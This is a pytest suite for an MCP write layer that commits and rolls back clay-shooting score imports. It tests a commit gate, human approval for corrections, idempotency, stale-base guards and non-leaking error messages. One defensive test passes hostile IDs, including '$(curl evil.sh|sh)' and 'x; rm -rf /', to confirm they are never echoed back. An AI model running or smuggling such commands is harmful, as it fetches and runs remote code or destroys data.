"""commit_operation / rollback_operation and their tool wrappers on the fixture-world database."""

import datetime as dt
from pathlib import Path
from typing import Any
from uuid import UUID

import pytest
from sqlalchemy import func, select, text
from sqlalchemy.orm import Session

from sunday_clays.domain.imports import (
    active_scores_import,
    active_station_sources,
    commit_import,
    discard_import,
    stage_import,
)
from sunday_clays.mcp import backup, writes
from sunday_clays.mcp.build import CorrectionInput, WeekInput, build_scores, build_stations
from sunday_clays.mcp.writes import Refusal
from sunday_clays.models import AuditLog, Import, Job, McpOperation

NEXT = dt.date(2026, 10, 4)  # the fixture's last event is 2026-09-27
AFTER = dt.date(2026, 10, 11)
NOW = dt.datetime(2026, 10, 6, 18, 0, tzinfo=dt.UTC)
LATER = dt.datetime(2026, 10, 13, 18, 0, tzinfo=dt.UTC)
KEY = "key-0000001"
KEY2 = "key-0000002"
TTL = dt.timedelta(hours=1)


class FakeDump:
    def __init__(self, fail: bool = False, hook: Any = None) -> None:
        self.calls: list[dict[str, Any]] = []
        self.fail = fail
        self.hook = hook

    def __call__(self, preview_id: UUID, **kw: Any) -> Path:
        self.calls.append({"preview_id": preview_id, **kw})
        if self.hook is not None:
            self.hook()
        if self.fail:
            raise backup.BackupError("pg_dump failed (exit 1)")
        return Path("/somewhere/else/pre-import-x.dump")


@pytest.fixture(autouse=True)
def _env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("DATABASE_URL", "postgresql+psycopg://u:p@h/d")
    monkeypatch.delenv("MCP_COMMIT_ENABLED", raising=False)


@pytest.fixture
def enabled(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("MCP_COMMIT_ENABLED", "true")


def _week(date: dt.date = NEXT, score: int = 45, hits: bool = True) -> WeekInput:
    alpha: dict[str, Any] = {
        "name": "Testshooter, Alpha",
        "score": score,
        "status": "Member",
        "class": "12 Gauge",
    }
    if hits:
        alpha["hits"] = [9, 9, 9, 9, score - 36]
    return WeekInput.model_validate(
        {
            "date": date,
            "stations": ["1", "2", "3", "4", "5"],
            "counts": [10, 10, 10, 10, 10],
            "shooters": [alpha, {"name": "Testshooter, Beta", "score": 30, "status": "Guest"}],
        }
    )


def _preview(session: Session, week: WeekInput | None = None, now: dt.datetime = NOW) -> str:
    return writes.preview_week(session, week or _week(), now=now).preview_id


def _correction(session: Session, now: dt.datetime = NOW) -> str:
    from sunday_clays.models import Round, Shooter

    last = dt.date(2026, 9, 27)
    name = session.scalars(
        select(Shooter.display_name)
        .join(Round, Round.shooter_id == Shooter.id)
        .where(Round.event_date == last)
        .order_by(Shooter.display_name)
        .limit(1)
    ).one()
    stored = session.scalar(
        select(Round.score)
        .join(Shooter, Shooter.id == Round.shooter_id)
        .where(Round.event_date == last, Shooter.display_name == name)
    )
    new = 7 if stored != 7 else 8
    c = CorrectionInput.model_validate({"date": last, "rows": [{"name": name, "score": new}]})
    return writes.preview_correction(session, c, now=now).preview_id


def _op(session: Session, preview_id: str) -> McpOperation:
    op = session.get(McpOperation, UUID(preview_id))
    assert op is not None
    session.refresh(op)
    return op


def _statuses(session: Session, preview_id: str) -> list[str | None]:
    op = _op(session, preview_id)
    return [
        session.scalar(select(Import.status).where(Import.id == i))
        for i in (op.scores_import_id, op.stations_import_id)
        if i is not None
    ]


def _commit(
    session: Session, pid: str, dump: FakeDump, key: str = KEY, now: dt.datetime = NOW
) -> dict[str, Any]:
    return writes.commit_week(session, pid, idempotency_key=key, now=now, dump=dump)


def _audits(session: Session, action: str) -> list[AuditLog]:
    return list(session.scalars(select(AuditLog).where(AuditLog.action == action)))


def _queued_rebuilds(session: Session) -> int:
    return (
        session.scalar(
            select(func.count(Job.id)).where(Job.kind == "rebuild", Job.status == "queued")
        )
        or 0
    )


# --- the gate ---------------------------------------------------------------------------------
def test_commits_are_disabled_by_default(fx_session: Session) -> None:
    pid = _preview(fx_session)
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, pid, dump)
    assert exc.value.code == "commits_disabled"
    assert f"python -m sunday_clays.mcp.approve {pid}" in exc.value.message
    assert dump.calls == []
    assert _op(fx_session, pid).status == "previewed"  # a human can still approve it
    assert _statuses(fx_session, pid) == ["pending", "pending"]
    assert not fx_session.scalars(
        select(McpOperation).where(McpOperation.status == "refused")
    ).all()
    assert [a.details["code"] for a in _audits(fx_session, "mcp.refuse")] == ["commits_disabled"]


@pytest.mark.parametrize(
    ("value", "on"),
    [
        ("true", True),
        ("1", True),
        ("TRUE", False),
        ("True", False),
        (" 1 ", False),
        (" true", False),
        ("yes", False),
        ("0", False),
        ("false", False),
        ("", False),
    ],
)
def test_gate_parsing(monkeypatch: pytest.MonkeyPatch, value: str, on: bool) -> None:
    monkeypatch.setenv("MCP_COMMIT_ENABLED", value)
    assert writes.commits_enabled() is on


def test_rollback_is_gated_too(fx_session: Session) -> None:
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        writes.rollback_week(fx_session, str(UUID(int=1)), idempotency_key=KEY, now=NOW, dump=dump)
    assert exc.value.code == "commits_disabled"
    assert dump.calls == []


# --- commit ----------------------------------------------------------------------------------
@pytest.mark.usefixtures("enabled")
def test_happy_path_commits_both_and_records_everything(fx_session: Session) -> None:
    base = active_scores_import(fx_session)
    pid = _preview(fx_session)
    dump = FakeDump()
    out = _commit(fx_session, pid, dump)
    op = _op(fx_session, pid)
    assert _statuses(fx_session, pid) == ["committed", "committed"]
    assert active_scores_import(fx_session) == op.scores_import_id != base
    assert (op.status, op.commit_path, op.idempotency_key) == ("committed", "mcp-auto", KEY)
    assert op.backup_file == "pre-import-x.dump"  # the file name only
    assert out["backup_file"] == "pre-import-x.dump"
    assert "/" not in str(out)
    assert out["status"] == "committed"
    assert op.committed_at == NOW
    assert op.job_id == out["job_id"]
    assert _queued_rebuilds(fx_session) == 1
    assert len(dump.calls) == 1
    assert dump.calls[0]["lock_timeout_s"] == 30
    assert str(dump.calls[0]["preview_id"]) == pid
    (audit,) = _audits(fx_session, "mcp.commit")
    assert audit.role == "mcp"
    assert audit.details["commit_path"] == "mcp-auto"
    assert "Testshooter" not in str(audit.details)


@pytest.mark.usefixtures("enabled")
def test_scores_only_week(fx_session: Session) -> None:
    pid = _preview(fx_session, _week(hits=False))
    _commit(fx_session, pid, FakeDump())
    assert _statuses(fx_session, pid) == ["committed"]


@pytest.mark.usefixtures("enabled")
def test_a_correction_is_never_committed_by_the_tool(fx_session: Session) -> None:
    pid = _correction(fx_session)
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, pid, dump)
    assert exc.value.code == "correction_needs_human"
    assert pid in exc.value.message
    assert dump.calls == []
    assert _op(fx_session, pid).status == "previewed"
    assert _statuses(fx_session, pid) == ["pending"]


def test_the_approve_path_commits_a_correction(fx_session: Session) -> None:
    pid = _correction(fx_session)
    out = writes.commit_operation(
        fx_session,
        pid,
        idempotency_key=KEY,
        commit_path="cli-approve",
        allow_correction=True,
        now=NOW,
        dump=FakeDump(),
    )
    assert out["commit_path"] == "cli-approve"
    assert _statuses(fx_session, pid) == ["committed"]


@pytest.mark.usefixtures("enabled")
def test_expired_preview_is_refused_and_discarded(fx_session: Session) -> None:
    pid = _preview(fx_session)
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, pid, dump, now=NOW + TTL + dt.timedelta(seconds=1))
    assert exc.value.code == "expired"
    assert dump.calls == []
    assert _op(fx_session, pid).status == "expired"
    assert _statuses(fx_session, pid) == ["discarded", "discarded"]


@pytest.mark.usefixtures("enabled")
def test_same_key_same_preview_replays_without_a_second_dump(fx_session: Session) -> None:
    pid = _preview(fx_session)
    dump = FakeDump()
    first = _commit(fx_session, pid, dump)
    again = _commit(fx_session, pid, dump)
    assert again == {**first, "current_status": "committed"}
    assert len(dump.calls) == 1
    assert _queued_rebuilds(fx_session) == 1
    assert len(_audits(fx_session, "mcp.commit")) == 1


@pytest.mark.usefixtures("enabled")
def test_same_key_other_preview_is_key_reused(fx_session: Session) -> None:
    first = _preview(fx_session)
    _commit(fx_session, first, FakeDump())
    second = _preview(fx_session, _week(AFTER, 40), now=LATER)
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, second, dump, now=LATER)
    assert exc.value.code == "key_reused"
    assert dump.calls == []
    assert _op(fx_session, second).status == "previewed"


@pytest.mark.usefixtures("enabled")
def test_other_key_on_a_committed_preview_is_already_committed(fx_session: Session) -> None:
    pid = _preview(fx_session)
    _commit(fx_session, pid, FakeDump())
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, pid, dump, key=KEY2)
    assert exc.value.code == "already_committed"
    assert dump.calls == []


@pytest.mark.usefixtures("enabled")
@pytest.mark.parametrize("key", ["short", "x" * 101, "has space!!", "ünicode-key-1", ""])
def test_bad_idempotency_keys(fx_session: Session, key: str) -> None:
    pid = _preview(fx_session)
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, pid, FakeDump(), key=key)
    assert exc.value.code == "invalid_idempotency_key"
    assert _statuses(fx_session, pid) == ["pending", "pending"]


@pytest.mark.usefixtures("enabled")
def test_unknown_and_malformed_preview_ids(fx_session: Session) -> None:
    for pid in (str(UUID(int=5)), "not-a-uuid"):
        with pytest.raises(Refusal) as exc:
            _commit(fx_session, pid, FakeDump())
        assert exc.value.code == "unknown_preview"


@pytest.mark.usefixtures("enabled")
def test_dump_failure_changes_nothing_and_is_retryable(fx_session: Session) -> None:
    base = active_scores_import(fx_session)
    pid = _preview(fx_session)
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, pid, FakeDump(fail=True))
    assert exc.value.code == "backup_failed"
    assert _statuses(fx_session, pid) == ["pending", "pending"]
    assert _op(fx_session, pid).status == "previewed"
    assert active_scores_import(fx_session) == base
    assert _queued_rebuilds(fx_session) == 0
    assert [a.details["code"] for a in _audits(fx_session, "mcp.refuse")] == ["backup_failed"]
    assert _commit(fx_session, pid, FakeDump())["status"] == "committed"  # the same key retries


# --- the stale-base guard ---------------------------------------------------------------------
def _assert_stale_refusal(
    session: Session, pid: str, dump: FakeDump, base_after_move: int | None
) -> None:
    rebuilds = _queued_rebuilds(session)
    with pytest.raises(Refusal) as exc:
        _commit(session, pid, dump)
    assert exc.value.code == "base_changed"
    assert active_scores_import(session) == base_after_move  # no live data changed
    assert _op(session, pid).status == "expired"
    assert set(_statuses(session, pid)) == {"discarded"}
    assert _queued_rebuilds(session) == rebuilds  # nothing new enqueued


@pytest.mark.usefixtures("enabled")
def test_a_correction_committed_after_the_preview_makes_it_stale(fx_session: Session) -> None:
    pid = _preview(fx_session)
    corr = _correction(fx_session)
    writes.commit_operation(
        fx_session,
        corr,
        idempotency_key=KEY2,
        commit_path="cli-approve",
        allow_correction=True,
        now=NOW,
        dump=FakeDump(),
    )
    moved = active_scores_import(fx_session)
    dump = FakeDump()
    _assert_stale_refusal(fx_session, pid, dump, moved)
    assert dump.calls == []  # the early check spares the dump


@pytest.mark.usefixtures("enabled")
def test_an_admin_upload_committed_after_the_preview_makes_it_stale(fx_session: Session) -> None:
    pid = _preview(fx_session)
    base = _op(fx_session, pid).result["base_import_id"]
    data = fx_session.scalars(select(Import.file_bytes).where(Import.id == base)).one()
    other = stage_import(fx_session, build_scores(data, _week(AFTER, 40)), "admin-upload.xlsx")
    commit_import(fx_session, other.import_id)
    dump = FakeDump()
    _assert_stale_refusal(fx_session, pid, dump, other.import_id)
    assert dump.calls == []


@pytest.mark.usefixtures("enabled")
def test_the_base_moving_during_the_dump_is_caught_under_the_lock(fx_session: Session) -> None:
    pid = _preview(fx_session)
    corr = _correction(fx_session)
    corr_scores = _op(fx_session, corr).scores_import_id
    assert corr_scores is not None

    def move() -> None:
        commit_import(fx_session, corr_scores)

    dump = FakeDump(hook=move)
    _assert_stale_refusal(fx_session, pid, dump, corr_scores)
    assert len(dump.calls) == 1  # the early check passed; the locked re-check refused


# --- admin interference -----------------------------------------------------------------------
@pytest.mark.usefixtures("enabled")
@pytest.mark.parametrize("which", [0, 1])
@pytest.mark.parametrize("action", ["commit", "discard"])
def test_an_admin_acting_on_a_pending_import_is_a_coded_refusal(
    fx_session: Session, which: int, action: str
) -> None:
    pid = _preview(fx_session)
    op = _op(fx_session, pid)
    target = (op.scores_import_id, op.stations_import_id)[which]
    assert target is not None
    (commit_import if action == "commit" else discard_import)(fx_session, target)
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, pid, dump)
    assert exc.value.code == "import_not_pending"
    assert dump.calls == []
    assert _op(fx_session, pid).status == "previewed"


@pytest.mark.usefixtures("enabled")
def test_an_admin_discard_during_the_dump_commits_nothing(fx_session: Session) -> None:
    pid = _preview(fx_session)
    op = _op(fx_session, pid)
    stations = op.stations_import_id
    assert stations is not None
    base = active_scores_import(fx_session)
    with pytest.raises(Refusal) as exc:
        _commit(fx_session, pid, FakeDump(hook=lambda: discard_import(fx_session, stations)))
    assert exc.value.code == "import_not_pending"
    assert active_scores_import(fx_session) == base
    assert _statuses(fx_session, pid) == ["pending", "discarded"]
    assert _queued_rebuilds(fx_session) == 0


# --- rollback ---------------------------------------------------------------------------------
def _rollback(
    session: Session, pid: str, dump: FakeDump, key: str = KEY2, now: dt.datetime = NOW
) -> dict[str, Any]:
    return writes.rollback_week(session, pid, idempotency_key=key, now=now, dump=dump)


@pytest.mark.usefixtures("enabled")
def test_rollback_happy_path(fx_session: Session) -> None:
    base = active_scores_import(fx_session)
    pid = _preview(fx_session)
    _commit(fx_session, pid, FakeDump())
    dump = FakeDump()
    out = _rollback(fx_session, pid, dump)
    op = _op(fx_session, pid)
    assert _statuses(fx_session, pid) == ["rolled_back", "rolled_back"]
    assert active_scores_import(fx_session) == base
    assert (op.status, op.rolled_back_at) == ("rolled_back", NOW)
    assert out["stations_rolled_back"] is True
    assert out["backup_file"] == "pre-import-x.dump"
    assert dump.calls[0]["lock_timeout_s"] == 30
    assert _queued_rebuilds(fx_session) == 1  # deduped with the commit's queued rebuild
    (audit,) = _audits(fx_session, "mcp.rollback")
    assert audit.role == "mcp"


@pytest.mark.usefixtures("enabled")
def test_rollback_replay_and_key_rules(fx_session: Session) -> None:
    pid = _preview(fx_session)
    _commit(fx_session, pid, FakeDump())
    dump = FakeDump()
    first = _rollback(fx_session, pid, dump)
    assert _rollback(fx_session, pid, dump) == {**first, "current_status": "rolled_back"}
    assert len(dump.calls) == 1
    with pytest.raises(Refusal) as again:
        _rollback(fx_session, pid, dump, key="key-0000003")
    assert again.value.code == "already_rolled_back"
    with pytest.raises(Refusal) as reused:  # the commit key is not a rollback key
        _rollback(fx_session, pid, dump, key=KEY)
    assert reused.value.code in {"key_reused", "already_rolled_back"}
    # The commit key still replays the stored commit result, with the live status alongside.
    replay = _commit(fx_session, pid, dump)
    assert replay["status"] == "committed"  # as stored
    assert replay["current_status"] == "rolled_back"  # as it is now
    assert _op(fx_session, pid).result["commit"]["status"] == "committed"  # stored result intact


@pytest.mark.usefixtures("enabled")
def test_rollback_refuses_an_uncommitted_preview(fx_session: Session) -> None:
    pid = _preview(fx_session)
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _rollback(fx_session, pid, dump)
    assert exc.value.code == "not_committed"
    assert dump.calls == []


@pytest.mark.usefixtures("enabled")
def test_rollback_refuses_a_non_latest_import(fx_session: Session) -> None:
    first = _preview(fx_session)
    _commit(fx_session, first, FakeDump())
    second = _preview(fx_session, _week(AFTER, 40), now=LATER)
    _commit(fx_session, second, FakeDump(), key="key-0000009", now=LATER)
    active = active_scores_import(fx_session)
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _rollback(fx_session, first, dump, now=LATER)
    assert exc.value.code == "not_latest"
    assert dump.calls == []
    assert active_scores_import(fx_session) == active
    assert _op(fx_session, first).status == "committed"


@pytest.mark.usefixtures("enabled")
def test_rollback_dump_failure_changes_nothing(fx_session: Session) -> None:
    pid = _preview(fx_session)
    _commit(fx_session, pid, FakeDump())
    with pytest.raises(Refusal) as exc:
        _rollback(fx_session, pid, FakeDump(fail=True))
    assert exc.value.code == "backup_failed"
    assert _op(fx_session, pid).status == "committed"
    assert _statuses(fx_session, pid) == ["committed", "committed"]


@pytest.mark.usefixtures("enabled")
def test_rollback_leaves_stations_another_import_now_provides(fx_session: Session) -> None:
    pid = _preview(fx_session)
    _commit(fx_session, pid, FakeDump())
    op = _op(fx_session, pid)
    # An admin later commits a newer station sheet for the same date.
    sheet = build_stations(_week(NEXT, 44))
    assert sheet is not None
    newer = stage_import(fx_session, sheet, "admin-stations.xlsx")
    commit_import(fx_session, newer.import_id)
    assert active_station_sources(fx_session)[NEXT] != op.stations_import_id
    out = _rollback(fx_session, pid, FakeDump())
    assert out["stations_rolled_back"] is False
    assert "left" in out["note"]
    assert _statuses(fx_session, pid) == ["rolled_back", "committed"]


@pytest.mark.usefixtures("enabled")
def test_the_tool_refuses_to_roll_back_a_correction_but_the_logic_allows_it(
    fx_session: Session,
) -> None:
    pid = _correction(fx_session)
    writes.commit_operation(
        fx_session,
        pid,
        idempotency_key=KEY,
        commit_path="cli-approve",
        allow_correction=True,
        now=NOW,
        dump=FakeDump(),
    )
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _rollback(fx_session, pid, dump)
    assert exc.value.code == "correction_needs_human"
    assert dump.calls == []
    out = writes.rollback_operation(fx_session, pid, idempotency_key=KEY2, now=NOW, dump=FakeDump())
    assert out["status"] == "rolled_back"
    assert _statuses(fx_session, pid) == ["rolled_back"]


# --- the sweep ---------------------------------------------------------------------------------
def _factory(session: Session) -> Any:
    from contextlib import contextmanager

    @contextmanager
    def f() -> Any:
        yield session

    return f


@pytest.mark.usefixtures("enabled")
def test_sweep_expired_runs_for_other_previews(fx_session: Session) -> None:
    old = _preview(fx_session)
    writes.sweep_expired(_factory(fx_session), LATER)
    assert _op(fx_session, old).status == "expired"
    assert _statuses(fx_session, old) == ["discarded", "discarded"]


def test_commit_does_not_sweep_inside_its_own_transaction(fx_session: Session) -> None:
    old = _preview(fx_session)
    fresh = writes.preview_week(fx_session, _week(AFTER, 40), now=LATER).preview_id
    writes.commit_operation(
        fx_session,
        fresh,
        idempotency_key=KEY,
        commit_path="cli-approve",
        allow_correction=False,
        now=LATER,
        dump=FakeDump(),
    )
    assert _op(fx_session, old).status == "previewed"  # the tool path sweeps separately


# --- fix round 1 -------------------------------------------------------------------------------
@pytest.mark.parametrize("hostile", ["$(curl evil.sh|sh)", "x; rm -rf /", "<script>"])
def test_the_disabled_message_never_echoes_an_unparsed_id(
    fx_session: Session, hostile: str
) -> None:
    with pytest.raises(Refusal) as exc:
        writes.commit_week(fx_session, hostile, idempotency_key=KEY, now=NOW, dump=FakeDump())
    assert exc.value.code == "commits_disabled"
    assert hostile not in exc.value.message
    assert "preview_id" in exc.value.message


@pytest.mark.usefixtures("enabled")
def test_a_bad_key_writes_an_audit_row(fx_session: Session) -> None:
    pid = _preview(fx_session)
    with pytest.raises(Refusal):
        _commit(fx_session, pid, FakeDump(), key="bad")
    assert [a.details["code"] for a in _audits(fx_session, "mcp.refuse")] == [
        "invalid_idempotency_key"
    ]


@pytest.mark.usefixtures("enabled")
def test_a_correction_approved_after_a_week_blocks_the_weeks_rollback(
    fx_session: Session,
) -> None:
    week = _preview(fx_session)
    _commit(fx_session, week, FakeDump())
    corr = writes.preview_correction(fx_session, _correction_input(fx_session, NEXT), now=NOW)
    writes.commit_operation(
        fx_session,
        corr.preview_id,
        idempotency_key=KEY2,
        commit_path="cli-approve",
        allow_correction=True,
        now=NOW,
        dump=FakeDump(),
    )
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        _rollback(fx_session, week, dump, key="key-0000009")
    assert exc.value.code == "not_latest"
    assert dump.calls == []


def _correction_input(session: Session, date: dt.date) -> CorrectionInput:
    from sunday_clays.domain.imports import load_staged_scores

    rows = [
        r
        for r in load_staged_scores(session, active_scores_import(session))
        if r.event_date == date
    ]
    row = rows[0]
    return CorrectionInput.model_validate(
        {"date": date, "rows": [{"name": row.raw_name, "score": 7 if row.score != 7 else 8}]}
    )


@pytest.mark.parametrize("sqlstate", ["40P01", "57014", "55P03"])
def test_lock_waits_and_deadlocks_become_a_coded_busy_refusal(
    fx_session: Session, sqlstate: str
) -> None:
    import psycopg.errors
    from sqlalchemy.exc import OperationalError

    orig_cls = {
        "40P01": psycopg.errors.DeadlockDetected,
        "57014": psycopg.errors.QueryCanceled,
        "55P03": psycopg.errors.LockNotAvailable,
    }[sqlstate]

    def boom(_s: Session) -> None:
        raise OperationalError("SELECT secret_sql FROM t", {}, orig_cls("detail"))

    with pytest.raises(Refusal) as exc:
        writes.run_write(_factory(fx_session), boom)
    assert exc.value.code == "busy"
    assert "secret_sql" not in exc.value.message
    assert "SELECT" not in exc.value.message


def test_non_database_errors_are_not_masked(fx_session: Session) -> None:
    def boom(_s: Session) -> None:
        raise RuntimeError("a genuine bug")

    with pytest.raises(RuntimeError):
        writes.run_write(_factory(fx_session), boom)


# --- fix round 2 -------------------------------------------------------------------------------
def _lifecycle_lock_mine(session: Session) -> int:
    from sunday_clays.domain.imports import IMPORT_LIFECYCLE_LOCK_KEY

    return int(
        session.execute(
            text(
                "SELECT count(*) FROM pg_locks WHERE locktype = 'advisory' AND objid = :k "
                "AND pid = pg_backend_pid() AND granted"
            ),
            {"k": IMPORT_LIFECYCLE_LOCK_KEY},
        ).scalar_one()
    )


def test_previews_never_sweep(fx_session: Session) -> None:
    stale = _preview(fx_session)
    writes.preview_week(fx_session, _week(AFTER, 40), now=LATER)
    assert _op(fx_session, stale).status == "previewed"  # untouched
    assert _statuses(fx_session, stale) == ["pending", "pending"]
    assert _lifecycle_lock_mine(fx_session) == 0


def test_correction_previews_never_sweep(fx_session: Session) -> None:
    stale = _preview(fx_session)
    _correction(fx_session, now=LATER)
    assert _op(fx_session, stale).status == "previewed"
    assert _statuses(fx_session, stale) == ["pending", "pending"]
    assert _lifecycle_lock_mine(fx_session) == 0


def test_the_preview_tools_sweep_first(fx_session: Session) -> None:
    stale = _preview(fx_session)
    writes.preview_week_tool(_factory(fx_session), _week(AFTER, 40), now=LATER)
    assert _op(fx_session, stale).status == "expired"


def test_the_correction_preview_tool_sweeps_first(fx_session: Session) -> None:
    from sunday_clays.models import Round, Shooter

    stale = _preview(fx_session)
    last = dt.date(2026, 9, 27)
    name, stored = fx_session.execute(
        select(Shooter.display_name, Round.score)
        .join(Round, Round.shooter_id == Shooter.id)
        .where(Round.event_date == last)
        .order_by(Shooter.display_name)
        .limit(1)
    ).one()
    c = CorrectionInput.model_validate(
        {"date": last, "rows": [{"name": name, "score": 7 if stored != 7 else 8}]}
    )
    writes.preview_correction_tool(_factory(fx_session), c, now=LATER)
    assert _op(fx_session, stale).status == "expired"


@pytest.mark.parametrize("tool", ["commit_week_tool", "rollback_week_tool"])
def test_the_gate_comes_before_the_sweep_and_the_dump(fx_session: Session, tool: str) -> None:
    stale = _preview(fx_session)
    dump = FakeDump()
    with pytest.raises(Refusal) as exc:
        getattr(writes, tool)(
            _factory(fx_session), stale, idempotency_key=KEY, now=LATER, dump=dump
        )
    assert exc.value.code == "commits_disabled"
    assert _op(fx_session, stale).status == "previewed"  # not swept: nothing changed
    assert _statuses(fx_session, stale) == ["pending", "pending"]
    assert dump.calls == []


def _boom_real_statement(session: Session) -> None:
    session.execute(text("SELECT secret_col FROM no_such_table WHERE name = :n"), {"n": "Zzname"})


def test_a_real_failing_statement_reaches_the_caller_as_db_error(fx_session: Session) -> None:
    with pytest.raises(Refusal) as exc:
        writes.run_write(_factory(fx_session), _boom_real_statement)
    assert exc.value.code == "db_error"
    assert exc.value.sqlstate == "42P01"
    for leaked in ("SELECT", "secret_col", "no_such_table", "Zzname", "parameters", "SQL"):
        assert leaked not in exc.value.message


def test_an_integrity_error_is_a_db_error_too(fx_session: Session) -> None:
    import psycopg.errors
    from sqlalchemy.exc import IntegrityError

    def boom(_s: Session) -> None:
        raise IntegrityError("INSERT ...", {"n": "Zzname"}, psycopg.errors.UniqueViolation("x"))

    with pytest.raises(Refusal) as exc:
        writes.run_write(_factory(fx_session), boom)
    assert (exc.value.code, exc.value.sqlstate) == ("db_error", "23505")
    assert "Zzname" not in exc.value.message


def test_busy_message_is_precise(fx_session: Session) -> None:
    import psycopg.errors
    from sqlalchemy.exc import OperationalError

    def boom(_s: Session) -> None:
        raise OperationalError("x", {}, psycopg.errors.DeadlockDetected("d"))

    with pytest.raises(Refusal) as exc:
        writes.run_write(_factory(fx_session), boom)
    assert exc.value.message == (
        "the database was busy; the scores were not changed; retry with the same idempotency key"
    )
